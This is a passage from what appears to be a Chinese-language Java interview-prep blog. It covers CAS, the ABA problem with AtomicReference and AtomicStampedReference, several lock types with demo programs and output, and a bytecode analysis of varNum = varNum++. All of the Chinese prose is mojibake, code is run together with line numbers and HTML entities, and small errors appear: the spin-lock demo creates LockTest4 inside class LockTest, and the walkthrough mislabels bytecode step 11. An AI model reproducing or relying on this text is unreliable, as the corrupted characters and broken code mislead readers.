æ–¹æ³•è¿›è¡Œæ¯”è¾ƒå’Œäº¤æ¢ï¼Œç›´åˆ°æˆåŠŸä¸ºæ­¢ å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒUnSafe ç±»ä¸­çš„ compareAndSwapInt() æ˜¯ä¸€ä¸ªæœ¬åœ°æ–¹æ³•ï¼Œè¯¥æ–¹æ³•çš„å…·ä½“å®ç°ä½äº unsafe.cpp ä¸­ã€‚ CAS çš„ç¼ºç‚¹ å¾ªç¯æ—¶é—´é•¿å¼€é”€å¤§ï¼šå¦‚æœ CAS å¤±è´¥ï¼Œä¼šä¸€ç›´ç»§ç»­å°è¯•ï¼›å¦‚æœ CAS é•¿æ—¶é—´ä¸€ç›´ä¸æˆåŠŸï¼Œå¯èƒ½ä¼šç»™ CPU å¸¦æ¥å¾ˆå¤§çš„å¼€é”€ åªèƒ½ä¿è¯ä¸€ä¸ªå…±äº«å˜é‡çš„åŸå­æ“ä½œï¼šå¯¹äºå¤šä¸ªå…±äº«å˜é‡æ“ä½œæ—¶ï¼Œå¾ªç¯ CAS å°±æ— æ³•ä¿è¯æ“ä½œçš„åŸå­æ€§äº†ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨é”æ¥ä¿è¯åŸå­æ€§ å¼•å‡ºäº† ABA é—®é¢˜ CAS çš„ ABA é—®é¢˜åœ¨åŸå­ç±»ï¼ˆå¦‚ AtomicIntegerï¼‰ä¸­ CAS ä¼šå¯¼è‡´ â€œABA é—®é¢˜â€ï¼Œè¿™æ˜¯å› ä¸º CAS ç®—æ³•å®ç°çš„ä¸€ä¸ªé‡è¦å‰ææ˜¯éœ€è¦å–å‡ºå†…å­˜ä¸­æŸæ—¶åˆ»çš„æ•°æ®å¹¶åœ¨å½“ä¸‹æ—¶åˆ»æ¯”è¾ƒå¹¶æ›¿æ¢ï¼Œé‚£ä¹ˆåœ¨è¿™ä¸ªæ—¶é—´å·®é‡Œæ•°æ®å¯èƒ½ä¼šå‘ç”Ÿå˜åŒ–ã€‚æ¯”å¦‚ä¸€ä¸ªçº¿ç¨‹ One ä»å†…å­˜ä½ç½® V ä¸­å–å‡º Aï¼Œè¿™ä¸ªæ—¶å€™å¦ä¸€ä¸ªçº¿ç¨‹ Two ä¹Ÿä»å†…å­˜ä¸­å–å‡º Aï¼Œå¹¶ä¸”çº¿ç¨‹ Two è¿›è¡Œäº†ä¸€äº›æ“ä½œå°†å†…å­˜ä½ç½® V ä¸­çš„å€¼æ”¹ä¸º Bï¼Œç„¶åçº¿ç¨‹ Two åˆå°†å†…å­˜ä½ç½® V çš„æ•°æ®æ”¹ä¸º Aï¼Œè¿™æ—¶å€™çº¿ç¨‹ One è¿›è¡Œ CAS æ“ä½œä¼šå‘ç°å†…å­˜ä¸­ä»ç„¶æ˜¯ Aï¼Œç„¶åçº¿ç¨‹ One å°±è®¤ä¸ºæ“ä½œæˆåŠŸäº†ã€‚å°½ç®¡çº¿ç¨‹ One çš„ CAS æ“ä½œæˆåŠŸï¼Œä½†æ˜¯ä¸ä»£è¡¨è¿™ä¸ªè¿‡ç¨‹å°±æ˜¯æ²¡é—®é¢˜çš„ï¼Œè¿™é‡Œæœ‰ç‚¹ç‹¸çŒ«æ¢å¤ªå­çš„æ„æ€ã€‚ åŸå­æ›´æ–°å¼•ç”¨åŸå­å¼•ç”¨JDK æä¾›äº† AtomicIntegerã€AtomicBooleanã€AtomicLong ç­‰åŸå­ç±»ï¼Œä½†å¦‚æœéœ€è¦å¯¹è‡ªå®šä¹‰çš„ç±»ï¼ˆå¦‚ User ç±»ï¼‰è¿›è¡ŒåŸå­åŒ…è£…ï¼Œé‚£ä¹ˆåˆ™éœ€è¦ä½¿ç”¨åŸå­å¼•ç”¨ç±» AtomicReference æ¥å®ç°ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š â˜…å±•å¼€ä»£ç â˜… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * åŸå­å¼•ç”¨ç±» AtomicReference çš„ä½¿ç”¨ */public class AtomicReferenceDemo { public static void main(String[] args) { User user1 = new User(20, "Jim"); User user2 = new User(24, "Tom"); AtomicReference&lt;User&gt; atomicReference = new AtomicReference&lt;User&gt;(); atomicReference.set(user1); boolean result = atomicReference.compareAndSet(user1, user2); System.out.println(result + " " + atomicReference.get()); boolean result2 = atomicReference.compareAndSet(user1, user2); System.out.println(result2 + " " + atomicReference.get()); }}class User { private int age; private String name; public int getAge() { return age; } public void setAge(int age) { this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public User(int age, String name) { this.age = age; this.name = name; } @Override public String toString() { return "User [age=" + age + ", name=" + name + "]"; }} 12true User [age=24, name=Tom]false User [age=24, name=Tom] ç‰ˆæœ¬å·åŸå­å¼•ç”¨æ™®é€šåŸå­ç±»ï¼ˆAtomicIntegerï¼‰æˆ–è€…åŸå­å¼•ç”¨ç±»ï¼ˆAtomicReferenceï¼‰ä¼šäº§ç”Ÿ ABA é—®é¢˜ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š â˜…å±•å¼€ä»£ç â˜… 123456789101112131415161718192021222324252627/** * ä¼šäº§ç”Ÿ ABA é—®é¢˜çš„ä»£ç  */public class ABADemo { public static AtomicReference&lt;Integer&gt; atomicReference = new AtomicReference&lt;Integer&gt;(100); public static void main(String[] args) { new Thread(() -&gt; { atomicReference.compareAndSet(100, 101); atomicReference.compareAndSet(101, 100); }, "t1").start(); new Thread(() -&gt; { try { // æš‚å®šä¸¤ç§’t2çº¿ç¨‹ï¼Œä¿è¯ä¸Šé¢çš„t1çº¿ç¨‹å®Œæˆäº†ä¸€æ¬¡ABAæ“ä½œ TimeUnit.SECONDS.sleep(2); } catch (InterruptedException e) { e.printStackTrace(); } boolean result = atomicReference.compareAndSet(100, 102); System.out.println(result + " " + atomicReference.get()); }, "t2").start(); }} 1true 102 ä½¿ç”¨ AtomicStampedReference ç‰ˆæœ¬å·åŸå­å¼•ç”¨ç±»è§£å†³ ABA é—®é¢˜ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š â˜…å±•å¼€ä»£ç â˜… 12345678910111213141516171819202122232425262728293031323334353637383940414243/** * ä½¿ç”¨ AtomicStampedReference ç‰ˆæœ¬å·åŸå­å¼•ç”¨ç±»è§£å†³ ABA é—®é¢˜ */public class AtomicStampedReferenceDemo { public static AtomicStampedReference&lt;Integer&gt; atomicStampedReference = new AtomicStampedReference&lt;Integer&gt;(100, 1); public static void main(String[] args) { new Thread(() -&gt; { int stamp = atomicStampedReference.getStamp(); System.out.println(Thread.currentThread().getName() + "åˆå§‹ç‰ˆæœ¬å·: " + stamp); try { // æš‚å®šä¸€ç§’t1çº¿ç¨‹ï¼Œä¿è¯ä¸‹é¢çš„t2çº¿ç¨‹æ‹¿åˆ°çš„åˆå§‹ç‰ˆæœ¬å·ä¸t1çš„åˆå§‹ç‰ˆæœ¬å·ä¸€è‡´ TimeUnit.SECONDS.sleep(1); } catch (InterruptedException e) { e.printStackTrace(); } atomicStampedReference.compareAndSet(100, 101, atomicStampedReference.getStamp(), atomicStampedReference.getStamp() + 1); System.out.println(Thread.currentThread().getName() + "ç¬¬ä¸€æ¬¡ä¿®æ”¹åçš„ç‰ˆæœ¬å·: " + atomicStampedReference.getStamp()); atomicStampedReference.compareAndSet(101, 100, atomicStampedReference.getStamp(), atomicStampedReference.getStamp() + 1); System.out.println(Thread.currentThread().getName() + "ç¬¬äºŒæ¬¡ä¿®æ”¹åçš„ç‰ˆæœ¬å·: " + atomicStampedReference.getStamp()); }, "t1").start(); new Thread(() -&gt; { int stamp = atomicStampedReference.getStamp(); System.out.println(Thread.currentThread().getName() + "åˆå§‹ç‰ˆæœ¬å·: " + stamp); try { // æš‚å®šä¸¤ç§’t2çº¿ç¨‹ï¼Œä¿è¯ä¸Šé¢çš„t1çº¿ç¨‹å®Œæˆäº†ä¸€æ¬¡ABAæ“ä½œ TimeUnit.SECONDS.sleep(2); } catch (InterruptedException e) { e.printStackTrace(); } boolean result = atomicStampedReference.compareAndSet(100, 102, stamp, stamp + 1); System.out.println(Thread.currentThread().getName() + "æ˜¯å¦ä¿®æ”¹æˆåŠŸï¼š" + result + "ï¼Œå½“å‰å®é™…æœ€æ–°çš„ç‰ˆæœ¬å·ä¸ºï¼š " + atomicStampedReference.getStamp()); System.out.println("å½“å‰å®é™…æœ€æ–°å€¼ä¸ºï¼š" + atomicStampedReference.getReference()); }, "t2").start(); }} 123456t1åˆå§‹ç‰ˆæœ¬å·: 1t2åˆå§‹ç‰ˆæœ¬å·: 1t1ç¬¬ä¸€æ¬¡ä¿®æ”¹åçš„ç‰ˆæœ¬å·: 2t1ç¬¬äºŒæ¬¡ä¿®æ”¹åçš„ç‰ˆæœ¬å·: 3t2æ˜¯å¦ä¿®æ”¹æˆåŠŸï¼šfalseï¼Œå½“å‰å®é™…æœ€æ–°çš„ç‰ˆæœ¬å·ä¸ºï¼š 3å½“å‰å®é™…æœ€æ–°å€¼ä¸ºï¼š100 ABA é—®é¢˜è§£å†³æ€»ç»“åŸå­å¼•ç”¨ + ç‰ˆæœ¬å·ï¼ˆç±»ä¼¼æ—¶é—´æˆ³ï¼‰æœºåˆ¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ JDK æä¾›çš„ç‰ˆæœ¬å·åŸå­å¼•ç”¨ç±» AtomicStampedReference æ¥è§£å†³ ABA é—®é¢˜ã€‚ Java é”å…¬å¹³é”å’Œéå…¬å¹³é”å…¬å¹³é”å’Œéå…¬å¹³é”ä»‹ç» JUC åŒ…ä¸­çš„å…¬å¹³é”å’Œéå…¬å¹³é”ç”¨çš„éƒ½æ˜¯ ReentrantLock å…¬å¹³é”ï¼šæ˜¯æŒ‡å¤šä¸ªçº¿ç¨‹æŒ‰ç…§ç”³è¯·é”çš„é¡ºåºæ¥è·å–é”ï¼Œç±»ä¼¼æ’é˜Ÿæ‰“é¥­ï¼Œå…ˆåˆ°å…ˆå¾— éå…¬å¹³é”ï¼šæ˜¯æŒ‡å¤šä¸ªçº¿ç¨‹è·å–é”çš„é¡ºåºå¹¶ä¸æ˜¯æŒ‰ç…§ç”³è¯·é”çš„é¡ºåºï¼Œæœ‰å¯èƒ½åç”³è¯·çš„çº¿ç¨‹æ¯”å…ˆç”³è¯·çš„çº¿ç¨‹ä¼˜å…ˆè·å–é”ã€‚åœ¨é«˜å¹¶å‘çš„æƒ…å†µä¸‹ï¼Œæœ‰å¯èƒ½ä¼šé€ æˆä¼˜å…ˆçº§åè½¬æˆ–è€…é¥¥é¥¿ç°è±¡ å…¬å¹³é”å’Œéå…¬å¹³é”çš„åŒºåˆ« å…¬å¹³é”ï¼šå…¬å¹³é”å°±æ˜¯å¾ˆå…¬å¹³ï¼Œåœ¨å¹¶å‘æƒ…å†µä¸‹ï¼Œæ¯ä¸ªçº¿ç¨‹åœ¨è·å–é”æ—¶ä¼šæŸ¥çœ‹æ­¤é”ç»´æŠ¤çš„ç­‰å¾…é˜Ÿåˆ—ï¼Œå¦‚æœä¸ºç©ºï¼Œæˆ–è€…å½“å‰çº¿ç¨‹æ˜¯ç­‰å¾…é˜Ÿåˆ—çš„ç¬¬ä¸€ä¸ªï¼Œå°±å æœ‰é”ï¼Œå¦åˆ™å°±ä¼šåŠ å…¥åˆ°ç­‰å¾…é˜Ÿåˆ—ä¸­ï¼Œä»¥åä¼šæŒ‰ç…§ FIFO çš„è§„åˆ™ä»é˜Ÿåˆ—ä¸­å–åˆ°è‡ªå·± éå…¬å¹³é”ï¼šéå…¬å¹³é”æ¯”è¾ƒç²—é²ï¼Œä¸Šæ¥å°±ç›´æ¥å°è¯•å æœ‰é”ï¼Œå¦‚æœå°è¯•å¤±è´¥ï¼Œå°±å†é‡‡å–ç±»ä¼¼å…¬å¹³é”é‚£ç§æ–¹å¼ï¼ˆç­‰å¾…é˜Ÿåˆ—ï¼‰å¤„ç† JUC åŒ…ä¸­ ReentrantLock çš„åˆ›å»ºå¯ä»¥æŒ‡å®šæ„é€ å‡½æ•°çš„ boolean ç±»å‹æ¥å¾—åˆ°å…¬å¹³é”æˆ–éå…¬å¹³é”ï¼Œé»˜è®¤æ˜¯éå…¬å¹³é”ã€‚éå…¬å¹³é”çš„ä¼˜ç‚¹åœ¨äºååé‡æ¯”å…¬å¹³é”å¤§ã€‚å¯¹äº Synchronized è€Œè¨€ï¼Œä¹Ÿæ˜¯ä¸€ç§éå…¬å¹³é”ã€‚ å¯é‡å…¥é”ï¼ˆé€’å½’é”ï¼‰å¯é‡å…¥é”ï¼ˆé€’å½’é”ï¼‰ä»‹ç» å¯é‡å…¥é”ï¼ˆé€’å½’é”ï¼‰æŒ‡çš„æ˜¯åŒä¸€ä¸ªçº¿ç¨‹å¤–å±‚å‡½æ•°è·å¾—é”ä¹‹åï¼Œå†…å±‚é€’å½’å‡½æ•°ä»ç„¶èƒ½è·å–è¯¥é”çš„ä»£ç ï¼Œåœ¨åŒä¸€çº¿ç¨‹åœ¨å¤–å±‚æ–¹æ³•è·å–é”çš„æ—¶å€™ï¼Œåœ¨è¿›å…¥å†…å±‚æ–¹æ³•ä¼šè‡ªåŠ¨è·å–é”ï¼ˆä»£ç å¦‚ä¸‹ï¼‰ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œçº¿ç¨‹å¯ä»¥è¿›å…¥ä»»ä½•ä¸€ä¸ªå®ƒå·²ç»æ‹¥æœ‰çš„é”æ‰€æœ‰åŒæ­¥ç€çš„ä»£ç å—ã€‚ReentrantLockã€Synchronized éƒ½æ˜¯å…¸å‹çš„å¯é‡å…¥é”ï¼ˆé€’å½’é”ï¼‰ã€‚å¯é‡å…¥é”æœ€å¤§çš„ä½œç”¨æ˜¯å¯ä»¥é¿å…æ­»é”ã€‚ 12345678910public class LockTest { public synchronized void method1() { method2(); } public synchronized void method2() { }} éªŒè¯ ReentrantLock æ˜¯å¯é‡å…¥é”çš„ä»£ç  â˜…å±•å¼€ä»£ç â˜… 123456789101112131415161718192021222324252627282930313233343536373839import java.util.concurrent.locks.ReentrantLock;/** * å¯é‡å…¥é”ï¼ˆé€’å½’é”ï¼‰ ReentrantLock éªŒè¯ä»£ç  */public class LockTest { private static ReentrantLock lock = new ReentrantLock(); public static void get() { lock.lock(); try { System.out.println(Thread.currentThread().getName() + "\\t invoked get()"); set(); } finally { lock.unlock(); } } public static void set() { lock.lock(); try { System.out.println(Thread.currentThread().getName() + "\\t invoked set()"); } finally { lock.unlock(); } } public static void main(String[] args) { new Thread(() -&gt; { get(); }, "t1").start(); new Thread(() -&gt; { get(); }, "t2").start(); }} 1234t1 invoked get()t1 invoked set()t2 invoked get()t2 invoked set() è‡ªæ—‹é”ï¼ˆSpinLockï¼‰è‡ªæ—‹é”ä»‹ç» è‡ªæ—‹é”æ˜¯æŒ‡å°è¯•è·å–é”çš„çº¿ç¨‹ä¸ä¼šç«‹å³é˜»å¡ï¼Œè€Œæ˜¯é‡‡ç”¨å¾ªç¯çš„æ–¹å¼å»å°è¯•è·å–é”ï¼Œè¿™æ ·çš„å¥½å¤„æ˜¯å‡å°‘çº¿ç¨‹ä¸Šä¸‹åˆ‡æ¢çš„æ¶ˆè€—ï¼Œç¼ºç‚¹æ˜¯å¾ªç¯è·å–é”çš„æ“ä½œä¼šæ¶ˆè€— CPU èµ„æºã€‚åœ¨ CAS ä¸­ Unsafe ç±»ä½¿ç”¨è‡ªæ—‹é”çš„ä»£ç å¦‚ä¸‹å›¾ï¼š éªŒè¯è‡ªæ—‹é”çš„ä»£ç  â˜…å±•å¼€ä»£ç â˜… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import java.util.concurrent.atomic.AtomicReference;/** * è‡ªæ—‹é”éªŒè¯ä»£ç  */public class LockTest { private AtomicReference&lt;Thread&gt; atomicReference = new AtomicReference&lt;Thread&gt;(); public void lock() { System.out.println(Thread.currentThread().getName() + "\\t come in"); Thread thread = Thread.currentThread(); // è‡ªæ—‹é”å®ç° while (!atomicReference.compareAndSet(null, thread)) { // do something } System.out.println(Thread.currentThread().getName() + "\\t lock"); } public void unlock() { System.out.println(Thread.currentThread().getName() + "\\t unlock"); Thread thread = Thread.currentThread(); // é‡Šæ”¾è‡ªæ—‹é” atomicReference.compareAndSet(thread, null); } public static void sleep(long mills) { try { Thread.sleep(mills); } catch (InterruptedException e) { e.printStackTrace(); } } public static void main(String[] args) { LockTest4 test = new LockTest4(); new Thread(() -&gt; { test.lock(); sleep(5000); test.unlock(); }, "t1").start(); sleep(1000); new Thread(() -&gt; { test.lock(); test.unlock(); }, "t2").start(); }} 123456t1 come int1 lockt2 come int1 unlockt2 lockt2 unlock ç‹¬å é”ï¼ˆå†™é”ï¼‰ä¸å…±äº«é”ï¼ˆè¯»é”ï¼‰ç‹¬å é”ï¼ˆå†™é”ï¼‰ä¸å…±äº«é”ï¼ˆè¯»é”ï¼‰ä»‹ç» ç‹¬å é”ï¼ˆå†™é”ï¼‰ï¼šæŒ‡è¯¥é”ä¸€æ¬¡åªèƒ½è¢«ä¸€ä¸ªçº¿ç¨‹æ‰€æŒæœ‰ï¼Œå¯¹äº ReentrantLock å’Œ Synchronized è€Œè¨€éƒ½æ˜¯ç‹¬å é”ï¼ˆå†™é”ï¼‰ å…±äº«é”ï¼ˆè¯»é”ï¼‰ï¼šæŒ‡è¯¥é”å¯è¢«å¤šä¸ªçº¿ç¨‹æ‰€æŒæœ‰ï¼Œå¯¹äº ReentrantReadWriteLockï¼Œå…¶è¯»é”æ˜¯å…±äº«é”ï¼Œå…¶å†™é”æ˜¯ç‹¬å é”ã€‚è¯»é”ï¼ˆå…±äº«é”ï¼‰å¯ä¿è¯å¹¶å‘è¯»æ˜¯éå¸¸é«˜æ•ˆçš„ï¼Œå…¶ä¸­è¯»å†™ã€å†™è¯»ã€å†™å†™çš„è¿‡ç¨‹æ˜¯äº’æ–¥çš„ï¼Œè€Œè¯»è¯»æ˜¯å¯ä»¥å…±å­˜çš„ éªŒè¯ç‹¬å é”ï¼ˆå†™é”ï¼‰ä¸å…±äº«é”ï¼ˆè¯»é”ï¼‰çš„ä»£ç  â˜…å±•å¼€ä»£ç â˜… 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import java.util.HashMap;import java.util.Map;import java.util.concurrent.TimeUnit;import java.util.concurrent.locks.ReentrantReadWriteLock;/* * éªŒè¯è¯»å†™é”ï¼Œç®€å•æ¨¡æ‹ŸMyBatisçš„ç¼“å­˜å®ç° * å¤šä¸ªçº¿ç¨‹åŒæ—¶è¯»åŒä¸€ä¸ªèµ„æºæ²¡æœ‰é—®é¢˜ï¼Œæ‰€ä»¥ä¸ºäº†æ»¡è¶³å¹¶å‘é‡ï¼Œè¯»å–å…±äº«èµ„æºåº”è¯¥å¯ä»¥åŒæ—¶è¿›è¡Œï¼Œä½†æ˜¯å†™å…±äº«èµ„æºåªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹ * å†™æ“ä½œï¼šåŸå­+ç‹¬å ï¼Œæ•´ä¸ªè¿‡ç¨‹å¿…é¡»æ˜¯ä¸€ä¸ªå®Œæ•´çš„ç»Ÿä¸€ä½“ï¼Œä¸­é—´ä¸è®¸è¢«åˆ†å‰²ï¼Œè¢«æ‰“æ–­ */class MyCache { private volatile Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); private ReentrantReadWriteLock reentrantReadWriteLock = new ReentrantReadWriteLock(); public void put(String key, Object value) { reentrantReadWriteLock.writeLock().lock(); try { System.out.println(Thread.currentThread().getName() + "\\t æ­£åœ¨å†™å…¥ï¼š" + key); try { TimeUnit.MILLISECONDS.sleep(300); } catch (InterruptedException e) { e.printStackTrace(); } map.put(key, value); System.out.println(Thread.currentThread().getName() + "\\t å†™å…¥å®Œæˆ"); } catch (Exception e) { e.printStackTrace(); } finally { reentrantReadWriteLock.writeLock().unlock(); } } public void get(String key) { reentrantReadWriteLock.readLock().lock(); try { System.out.println(Thread.currentThread().getName() + "\\t æ­£åœ¨è¯»å–ï¼š" + key); try { TimeUnit.MILLISECONDS.sleep(300); } catch (InterruptedException e) { e.printStackTrace(); } Object result = map.get(key); System.out.println(Thread.currentThread().getName() + "\\t è¯»å–å®Œæˆ" + result); } catch (Exception e) { e.printStackTrace(); } finally { reentrantReadWriteLock.readLock().unlock(); } }}public class ReadWriteLockDemo { public static void main(String[] args) { MyCache myCache = new MyCache(); for (int i = 1; i &lt;= 5; i++) { final int tempInt = i; new Thread(() -&gt; { myCache.put(tempInt + "", tempInt + ""); }, String.valueOf(i)).start(); } for (int i = 1; i &lt;= 5; i++) { final int tempInt = i; new Thread(() -&gt; { myCache.get(tempInt + ""); }, String.valueOf(i)).start(); } }} 12345678910111213141516171819202 æ­£åœ¨å†™å…¥ï¼š22 å†™å…¥å®Œæˆ1 æ­£åœ¨å†™å…¥ï¼š11 å†™å…¥å®Œæˆ5 æ­£åœ¨å†™å…¥ï¼š55 å†™å…¥å®Œæˆ1 æ­£åœ¨è¯»å–ï¼š14 æ­£åœ¨è¯»å–ï¼š41 è¯»å–å®Œæˆ14 è¯»å–å®Œæˆnull4 æ­£åœ¨å†™å…¥ï¼š44 å†™å…¥å®Œæˆ3 æ­£åœ¨å†™å…¥ï¼š33 å†™å…¥å®Œæˆ3 æ­£åœ¨è¯»å–ï¼š35 æ­£åœ¨è¯»å–ï¼š52 æ­£åœ¨è¯»å–ï¼š23 è¯»å–å®Œæˆ35 è¯»å–å®Œæˆ52 è¯»å–å®Œæˆ2 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ä¼ä¸šé¢è¯•"},{title:"Java åŸºç¡€é¢è¯•é¢˜ä¹‹ä¸€",url:"/posts/d6058b93.html",text:'Java åŸºç¡€è‡ªå¢å˜é‡ä»£ç æ¡ˆä¾‹: 12345678910public class Test { public static void main(String[] args) { int a = 10; int varNum = 66; varNum = varNum++; System.out.println(varNum); } // è¿è¡Œç»“æœï¼š 66} çŸ¥è¯†ç‚¹ï¼š å±€éƒ¨å˜é‡è¡¨ (Local Variable Table)ï¼šä¸€ç»„å˜é‡å€¼çš„å­˜å‚¨ç©ºé—´ï¼Œç”¨äºå­˜æ”¾æ–¹æ³•å‚æ•°å’Œæ–¹æ³•å†…å®šä¹‰çš„å±€éƒ¨å˜é‡ æ“ä½œæ•°æ ˆï¼šåœ¨å†…å­˜åˆ†æçš„æ—¶å€™ï¼Œéƒ½è¢«æ”¾å…¥äº†æ ˆä¸­ï¼Œæ ˆçš„ç‰¹ç‚¹æ˜¯å…ˆè¿›åå‡ºï¼ˆLIFOï¼‰ï¼Œæ„å‘³ç€å…ˆæ”¾è¿›å»çš„æ•°ï¼Œä¼šè¢«æ”¾åœ¨ä¸‹é¢ï¼Œåè¿›å»çš„æ•°ï¼Œä¸€ä¸ªä¸€ä¸ªå’åœ¨ä¸Šé¢ iconst è™šæ‹ŸæœºæŒ‡ä»¤ï¼šå°†å¸¸é‡åŠ è½½åˆ°æ“ä½œæ•°æ ˆä¸Šï¼ˆå…¥æ ˆï¼‰ï¼Œå¯ä»¥ç”¨æ¥å°† int ç±»å‹çš„æ•°å­—ã€å–å€¼åœ¨ -1 åˆ° 5 ä¹‹é—´çš„æ•´æ•°å‹å…¥æ ˆä¸­ push è™šæ‹ŸæœºæŒ‡ä»¤ï¼šä¸»è¦åŒ…æ‹¬ bipush å’Œ sipushï¼Œå®ƒä»¬çš„åŒºåˆ«åœ¨äºæ¥æ”¶æ•°æ®ç±»å‹çš„ä¸åŒï¼Œbipush æ¥æ”¶ 8 ä½æ•´æ•°ä½œä¸ºå‚æ•°ï¼Œsipush æ¥æ”¶ 16 ä½æ•´æ•°ï¼Œå®ƒä»¬éƒ½å°†å‚æ•°å‹å…¥æ ˆ istore_n è™šæ‹ŸæœºæŒ‡ä»¤ï¼šä»æ“ä½œæ•°æ ˆä¸­å¼¹å‡ºä¸€ä¸ªæ•´æ•°ï¼Œå¹¶æŠŠå®ƒèµ‹å€¼ç»™ç¬¬ n ä¸ªå±€éƒ¨å˜é‡ xload_n è™šæ‹ŸæœºæŒ‡ä»¤ï¼šè¡¨ç¤ºå°†ç¬¬ n ä¸ªå±€éƒ¨å˜é‡å‹å…¥æ“ä½œæ•°æ ˆï¼Œæ¯”å¦‚ iload_1ã€fload_0ã€aload_0 ç­‰æŒ‡ä»¤ï¼Œå…¶ä¸­ aload_n è¡¨ç¤ºå°†ä¸€ä¸ªå¯¹è±¡å¼•ç”¨å‹æ ˆ iinc è™šæ‹ŸæœºæŒ‡ä»¤ï¼šå¯¹ç»™å®šçš„å±€éƒ¨å˜é‡åšè‡ªå¢æ“ä½œï¼Œè¿™æ¡æŒ‡ä»¤æ˜¯å°‘æ•°å‡ ä¸ªæ‰§è¡Œè¿‡ç¨‹ä¸­å®Œå…¨ä¸ä¿®æ”¹æ“ä½œæ•°æ ˆçš„æŒ‡ä»¤ï¼›å®ƒæ¥æ”¶ä¸¤ä¸ªæ“ä½œæ•°ï¼šç¬¬ 1 ä¸ªå±€éƒ¨å˜é‡è¡¨çš„ä½ç½®ï¼Œç¬¬ 2 ä¸ªä½ç´¯åŠ æ•°ã€‚æ¯”å¦‚å¸¸è§çš„ i++ å°±ä¼šäº§ç”Ÿè¿™æ¡æŒ‡ä»¤ é—®é¢˜åˆ†æï¼š ä¸‹é¢å°†ä½¿ç”¨ javap å·¥å…·æ¥åˆ†æé—®é¢˜ï¼Œjavap æ˜¯ JDK è‡ªå¸¦çš„åæ±‡ç¼–å™¨ï¼Œå¯ä»¥æŸ¥çœ‹ Java ç¼–è¯‘å™¨ç”Ÿæˆçš„å­—èŠ‚ç ã€‚é€šè¿‡å®ƒï¼Œå¯ä»¥å¯¹ç…§æºä»£ç å’Œå­—èŠ‚ç ï¼Œä»è€Œæ›´äº†è§£ç¼–è¯‘å™¨å†…éƒ¨çš„å·¥ä½œè¿‡ç¨‹ã€‚æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š javac Test.java javap -c Test javap åæ±‡ç¼–åï¼Œä¼šè¾“å‡ºä»¥ä¸‹å†…å®¹ï¼Œå…¶ä¸­ main() é‡Œæ˜¯ varNum = varNum++ çš„æ‰§è¡Œè¿‡ç¨‹ 12345678910111213141516171819202122Compiled from "Test.java"public class Test { public Test(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object."&lt;init&gt;":()V 4: return public static void main(java.lang.String[]); Code: 0: bipush 10 2: istore_1 3: bipush 66 5: istore_2 6: iload_2 7: iinc 2, 1 10: istore_2 11: getstatic #2 // Field java/lang/System.out:Ljava/io/PrintStream; 14: iload_2 15: invokevirtual #3 // Method java/io/PrintStream.println:(I)V 18: return} ç»“åˆä¸Šé¢é“ºå«çš„è™šæ‹ŸæœºæŒ‡ä»¤ï¼Œè¿™é‡Œè®²è§£ main() é‡Œçš„ 0 -11 çš„å·¥ä½œæµç¨‹ï¼š 0: bipush 10 å°†å‚æ•° 10 å‹å…¥æ“ä½œæ•°æ ˆ 2: istore_1 ä»æ“ä½œæ•°æ ˆä¸­å¼¹å‡ºä¸€ä¸ªæ•°ï¼Œèµ‹ç»™ç¬¬ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼ˆaï¼‰ 3: bipush 66 å°†å‚æ•° 66 å‹å…¥æ“ä½œæ•°æ ˆ 5: istore_2 ä»æ“ä½œæ•°æ ˆä¸­å¼¹å‡ºä¸€ä¸ªæ•°ï¼Œèµ‹ç»™ç¬¬äºŒä¸ªå±€éƒ¨å˜é‡ï¼ˆvarNumï¼‰ 6: iload_2 å°†ç¬¬äºŒä¸ªå±€éƒ¨å˜é‡ï¼ˆvarNumï¼‰çš„å€¼å…¥æ ˆï¼Œæ­¤æ—¶æ“ä½œæ•°æ ˆçš„æ ˆé¡¶å€¼ä¸º 66 7: iinc 2, 1 å¯¹ç¬¬äºŒä¸ªå±€éƒ¨å˜é‡ï¼ˆvarNumï¼‰åšè‡ªå¢ 1 æ“ä½œï¼Œæ„å‘³ç€å±€éƒ¨å˜é‡ varNum çš„å€¼å˜ä¸º 67ï¼›ç‰¹åˆ«æ³¨æ„ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰ä¿®æ”¹æ“ä½œæ•°æ ˆé‡Œçš„ä»»ä½•å†…å®¹ 10: istore_2 ä»æ“ä½œæ•°æ ˆçš„æ ˆé¡¶å¼¹å‡ºä¸€ä¸ªæ•°ï¼ˆå³ 66ï¼‰èµ‹ç»™ç¬¬äºŒä¸ªå±€éƒ¨å˜é‡ï¼ˆvarNumï¼‰ï¼Œæ„å‘³å±€éƒ¨å˜é‡ varNum çš„å€¼åˆå˜å› 66 äº† 11: iload_2 å°†ç¬¬äºŒä¸ªå±€éƒ¨å˜é‡ï¼ˆvarNumï¼‰çš„å€¼å…¥æ ˆï¼Œæ­¤æ—¶æ“ä½œæ•°æ ˆçš„æ ˆé¡¶å€¼ä¸º 66 æœ€ç»ˆæ‰“å°ç»“æœå°±æ˜¯ï¼š66 Java Lang Spec 